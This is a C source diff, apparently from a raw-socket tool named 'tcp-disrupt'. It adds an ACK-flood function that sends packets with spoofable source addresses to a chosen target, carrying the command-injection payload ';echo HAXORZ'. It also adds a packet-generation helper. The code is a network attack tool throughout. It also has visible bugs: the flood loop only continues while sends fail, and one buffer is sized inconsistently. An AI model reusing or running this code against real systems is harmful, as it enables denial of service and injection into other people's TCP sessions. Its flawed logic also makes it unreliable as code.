@@ -1,15 +1,52 @@
 #include "tcp-disrupt.h"
 
-void send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
+/** Sends an ACK flood.
+ *  
+ *  srcIP     - the ip to send the flood from
+ *  dstIP     - where to send the flood
+ *  dstPort   - the port to send the flood to
+ *  srcPort   - the port to send the flood from
+ *  sqe       - the starting seq number
+ *  ack_seq   - the starting ack number
+ *  n         - how many ack's to send
+ *  socket_fd - socket file descriptor
+ */
+bool ack_flood(     char *srcIP,
+                    char *dstIP,
+                    u_int16_t dstPort,
+                    u_int16_t srcPort,
+                    u_int32_t seq,
+                    u_int32_t ack_seq,
+                    int n,
+                    int socket_fd,
+                    struct sockaddr_in addr_in) {
+
+    const char * data = ";echo HAXORZ";
+    int data_len = strlen(data);
+    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
+    char *packet = (char *) malloc(packet_size);
+    struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
+
+    fill_packet(srcIP, dstIP, dstPort, srcPort, 0, 0, seq, ack_seq, data, packet, packet_size);
+
+    int i;
+    bool b = true;
+    for (i = 0; i < n && b; ++i) {
+        b =  0 > send_packet(socket_fd, packet, addr_in);
+        tcpHdr->seq = htonl(seq + i);
+    }
+
+    free(packet);
+
+    return b;
+}
+
+int send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
     int bytes;
     struct iphdr *ipHdr = (struct iphdr *) packet;
 
-    if((bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
-        perror("Error on sendto()");
-    }
-    else {
-        printf("\nSuccess! Sent %d bytes.\n", bytes);
-    }
+    bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in));
+    return bytes;
 }
 
 void fill_packet(   char *srcIP,
@@ -51,15 +88,15 @@ void fill_packet(   char *srcIP,
     //TCP header
     tcpHdr->source = htons(srcPort);
     tcpHdr->dest = htons(dstPort);
-    tcpHdr->seq = htonl(seq);
-    tcpHdr->ack_seq = htonl(ack_seq);
+    tcpHdr->seq = htonl(seq);           //sequence number
+    tcpHdr->ack_seq = htonl(ack_seq);   //ack sequence number, depends whether ACK is set or not
     tcpHdr->res1 = 0;
     tcpHdr->doff = 5;
     tcpHdr->fin = 0;
     tcpHdr->syn = syn;
     tcpHdr->rst = 0;
     tcpHdr->psh = 0;
-    tcpHdr->ack = ack;
+    tcpHdr->ack = ack;                  //if you are acknowledging a sec number
     tcpHdr->urg = 0;
     tcpHdr->res2 = 0;
     tcpHdr->window = htons(43690);
@@ -134,4 +171,21 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
     answer=(short)~sum;
 
     return(answer);
+}
+
+char* gen_packet(   char *srcIP,
+                    char *dstIP,
+                    u_int16_t dstPort,
+                    u_int16_t srcPort,
+                    u_int32_t syn,
+                    u_int16_t ack,
+                    u_int32_t seq,
+                    u_int32_t ack_seq,
+                    const char * data,
+                    uint32_t packet_size) {
+
+
+        char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
+        fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, seq, ack_seq, data, packet, packet_size);
+        return packet;
 }
